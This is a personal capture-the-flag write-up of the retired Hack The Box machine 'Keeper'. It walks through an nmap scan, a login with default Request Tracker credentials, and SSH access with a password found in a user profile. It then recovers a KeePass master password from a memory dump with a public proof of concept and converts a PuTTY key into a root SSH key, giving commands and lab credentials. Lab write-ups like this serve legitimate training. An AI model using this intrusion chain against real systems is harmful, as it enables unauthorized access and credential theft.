# Keeper
Week 3 of trying to consistently solve a HTB.

Metadata:
- OS: Linux
- Difficulty: Easy
- Status: Retired
- TARGET:10.10.11.227
- HOST_IP: 10.10.14.175
- Date: 2024-01-28
---



## Recon
Start off simple, do an nmap scan.
Ran `sudo nmap -p- -sC -sV $TARGET --open`
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-28 13:33 CST
Nmap scan report for 10.10.11.227
Host is up (0.073s latency).
Not shown: 60981 closed tcp ports (reset), 4552 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.59 seconds
```

## Gaining Access
Since 80 was open. I figure we start with a simple `http://10.10.11.227`.

Quickly realized, the website needs `keeper.htb` and `tickets.keeper.htb` to access it from the browser.

```bash
sudo vim /etc/hosts

#add
10.10.11.227 tickets.keeper.htb
10.10.11.227 keeper.htb
```

### Accessing the website using http

Navigating to `http://tickets.keeper.htb` takes you to a login page for the ticketing system.

This is where I probably got the most distracted trying to google a vulnerability. The box uses Best Practical's Request Tracker.

I tried to find vulnerabilities based on their version: `RT 4.4.4+dfsg-2ubuntu1`. This felt like a rabbit hole of potential vulnerabilities without any active PoC.

After 30 mins of mindless google, I sadly realized when you google `request tracker default credentials`. Google immediately tells you: `root/password` are the default creds. (I probably should have looked for this first lol).

## Gaining User Access
This part was probably the most straight forward. If you do some searching on the site as root, you'll come across a Users directory. One of the users contains credentials in the profile. Figure I might as well try it via ssh.

User: `lnorgaard`
password: `Welcome2023!`
```bash
ssh lnorgaard@10.10.11.227
```
### User Flag
Soon as you login with the credentials, you're in the home directory: `cat user.txt`

## Privilege Escalation
This is what I think makes this box actually easy - inside the home directory. You're given two KeePass files: `KeePassDumpFull.dmp` and `passcodes.kdbx`

Fortunately, I'm actually familiar with KeePass from a previous job. KeePass is a password manager. So I knew the kdbx file is an encrypted file containing a root password.

```bash
ls -lah
total 326M
drwxr-xr-x 6 lnorgaard lnorgaard 4.0K Jan 28 21:42 .
drwxr-xr-x 3 root      root      4.0K May 24  2023 ..
lrwxrwxrwx 1 root      root         9 May 24  2023 .bash_history -> /dev/null
-rw-r--r-- 1 lnorgaard lnorgaard  220 May 23  2023 .bash_logout
-rw-r--r-- 1 lnorgaard lnorgaard 3.7K May 23  2023 .bashrc
drwx------ 2 lnorgaard lnorgaard 4.0K May 24  2023 .cache
-rwxr-x--- 1 lnorgaard lnorgaard 242M May 24  2023 KeePassDumpFull.dmp # <- important
-rwxr-x--- 1 lnorgaard lnorgaard 3.6K May 24  2023 passcodes.kdbx # <- important
-rw------- 1 lnorgaard lnorgaard  807 May 23  2023 .profile
-rw------- 1 lnorgaard lnorgaard    7 Jan 28 21:42 .python_history
-rw-r--r-- 1 root      root       84M Jan 28 21:46 RT30000.zip
drwx------ 2 lnorgaard lnorgaard 4.0K Jul 24  2023 .ssh
-rw-r----- 1 root      lnorgaard   33 Jan 28 18:30 user.txt
-rw-r--r-- 1 root      root        39 Jul 20  2023 .vimrc
```

With a quick Google search: `keepass dump file exploit`, you find this [PoC from github](https://github.com/vdohney/keepass-password-dumper?tab=readme-ov-file).

Special thanks to `vdohney` for their PoC and also mentioning a [python version](https://github.com/matro7sh/keepass-dump-masterkey) by `CMEPW`(unsure, if `matro7sh` is the same person. Shout out to them as well!)

```bash
git clone https://github.com/matro7sh/keepass-dump-masterkey.git
cd keepass-dump-masterkey/
```

Now we need to get the dump file and password file back to my kali machine.We can use python to start an http server to curl the contents back to myself
```
#from the victim machine
python3 -m http.server
#this will open port 8000. Therefore I can easily curl it back

#from host machine (inside the git clone repo)
curl http://$TARGET:8000/passcodes.kdbx > passcodes.kdbx
curl http://$TARGET:8000/KeePassDumpFull.dmp > dumpy.dmp
```

### Crack the Password Manager
This is where `tmux`, my terminal in kali and trying to copy/paste failed me. When you run the python script against the dump file. you get output like this:
```bash
python3 poc.py ../dumpy.dmp
2024-01-28 14:53:01,481 [.] [main] Opened ../dumpy.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```

Unfortunately, I was super close but ultimately had to reach out to a solution to realize how close I was.

Thank you `Imène ALLOUCHE` for your [write-up](https://medium.com/@li_allouche/hack-the-box-keeper-writeup-56644dc6a55f)

What we were essentially getting was the password `dgrød med flød`. However, I didn't have terminal configured to handle complex unicode characters. /facepalm. Sounds like I need to spend some time configuring my environment to be like my old Kali machine.

If you google `dgrød med flød` you will quickly find the 2 characters and the password: `rødgrød med flød`

### Installing KeePass and gaining Root
```bash
#on kali
sudo apt install keepass2
keepass2 passcodes.kdbx
```

Once you provide the master pass, `rødgrød med flød`


## Getting the Root flag
This is probably the main thing I learned from this challenge. The root password in this keystore didn't seem to work. However, inside there was a `Putty Private Key`. First, I didn't know this format existed. Second, I didn't know you could use this to generate a valid `id_rsa` file to ssh as root. Once again, thank you `Imène`.

```bash
# first we need puttygen
sudo apt install putty-tools
# Next we need to save the Private key inside KeePass. I named mine root.ppk
puttygen root.ppk -O private-openssh -o id_rsa
# now we have the private key in a format we can use for ssh
ssh root@10.10.11.227 -i id_rsa
cat root.txt
```

# Final Thoughts
Really easy box I could have gotten without reading a write-up - I just made some noob mistakes with how my environment is configured. I plan to fix my copy/paste issues and get better unicode support in my terminal. Also, need to make it a habit to google default credentials before looking for a PoC.

## The one thing I learned
I never knew `ppk` files existed (try to avoid windows to be honest). So that was neat to learn. I recommend reading the article on ppk if curious. I felt like I learned something new.

Definitely an easy, but I still enjoyed it. My main focus right now is staying consistent. Hopefully in a couple weeks, I can increase the difficult and get back to using some advanced tools/techniques. Or maybe, I'll try to write my own PoC from scratch (if the vuln is easy lol) - haven't decided yet.


Resources
---
- [Article on ppk](https://www.baeldung.com/linux/ssh-key-types-convert-ppk)
- [Write-up](https://medium.com/@li_allouche/hack-the-box-keeper-writeup-56644dc6a55f)
- [KeePass PoC](https://github.com/vdohney/keepass-password-dumper?tab=readme-ov-file)
- [Python PoC](https://github.com/matro7sh/keepass-dump-masterkey)

